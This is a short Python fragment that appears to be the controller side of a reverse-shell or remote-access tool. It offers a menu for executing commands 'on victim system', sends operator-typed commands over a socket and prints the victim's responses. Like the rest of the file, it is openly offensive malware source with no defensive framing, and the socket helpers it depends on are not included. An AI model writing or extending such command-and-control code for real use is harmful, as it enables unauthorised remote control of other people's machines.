def options():
    print("[+] Enter '1' to Execute command on victim system")
    print("[+] Enter 'exit' to exit the handler and close the connection")

def send_command(sock):
    while True:
        command=input(">> ")
        sock.send_data(command)
        if command=="":
            continue
        if command=="exit":
            print("[+] Exiting shell")
            break
        response=sock.recieve_data()
        print(response)

def handler(sock):
    print("[+] Handler has started")
    print("tip: enter 'help' to see what you can do")

    while True:
        User_input=input("What do you want to do: ")
        if User_input=="1":
            # User_input=input("Enter command: ")
            sock.send_data(User_input)
            send_command(sock)
            #send command to victim

        elif User_input=="help":
            options()
        elif User_input=="exit":
            print("[+] Exiting handler")
            sock.send_data(User_input)

            break
        else:
            print("[+] Invalid input")
            options()